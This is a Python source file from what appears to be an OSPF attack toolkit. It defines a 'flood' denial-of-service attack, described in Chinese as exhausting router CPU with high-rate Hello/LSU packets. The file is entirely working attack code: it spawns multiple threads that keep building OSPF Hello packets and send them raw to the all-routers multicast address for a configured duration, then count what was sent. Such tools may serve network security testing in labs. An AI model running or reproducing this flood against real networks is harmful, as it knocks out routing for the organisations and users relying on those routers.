import threading
import time
from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import DoSConfig
from ospf_attack.core.packet import build_hello_packet, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender


class FloodAttack(BaseAttack):
    name = "flood"
    description = "高频发送 Hello/LSU 报文耗尽路由器 CPU"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        self._senders = []
        for _ in range(self.config.thread_count):
            self._senders.append(PacketSender(
                iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
            ))
        self._stop_event = threading.Event()

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)

        def _flood_worker(sender):
            while not self._stop_event.is_set():
                pkt = build_hello_packet(
                    router_id=self.config.router_id, area_id=self.config.area_id,
                    src_ip=src_ip, dst_ip=OSPF_MULTICAST_ALL,
                )
                sender.send_raw(pkt)

        threads = []
        for sender in self._senders:
            t = threading.Thread(target=_flood_worker, args=(sender,), daemon=True)
            t.start()
            threads.append(t)

        time.sleep(self.config.duration)
        self._stop_event.set()
        for t in threads:
            t.join(timeout=2)

        total_sent = sum(s.sent_count for s in self._senders)
        return AttackResult(success=True, packets_sent=total_sent, target_affected=False,
                           details=f"泛洪攻击: {total_sent} packets, {self.config.thread_count} threads")

    def verify(self) -> bool:
        return sum(s.sent_count for s in self._senders) > 0

    def teardown(self) -> None:
        self._stop_event.set()
